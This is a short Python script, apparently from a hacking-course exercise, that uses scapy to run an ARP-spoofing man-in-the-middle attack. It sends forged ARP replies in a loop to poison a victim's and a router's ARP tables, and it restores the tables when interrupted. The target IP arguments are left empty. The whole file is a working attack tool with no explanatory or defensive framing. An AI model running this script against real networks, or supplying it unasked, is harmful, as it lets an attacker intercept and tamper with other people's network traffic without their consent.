#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(targetip, spoofip):
    # op = answer/request, pdst = iptarget, hwdst = mactarget, psrc = iprouter
    target_mac = get_mac(targetip)
    packet = scapy.ARP(op=2, pdst=targetip, hwdst=target_mac, psrc=spoofip)
    scapy.send(packet, verbose=False)

def restore(destinationip, sourceip):
    destinationmac = get_mac(destinationip)
    sourcemac = get_mac(sourceip)
    packet = scapy.ARP(op=2, pdst=destinationip, hwdst=destinationmac, psrc=sourceip, hwsrc=sourcemac)
    scapy.send(packet, count=4, verbose=False)

send_packets = 0
try:
    while True:
        spoof("", "") #router => im client
        spoof("", "") #client => im router
        send_packets += 2
        print("\r[+] Spend packets:" + str(send_packets), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Stopped, restore ARP-table...")
    restore("", "") #router => im client
    restore("", "") #client => im router
    print("[+] Successful")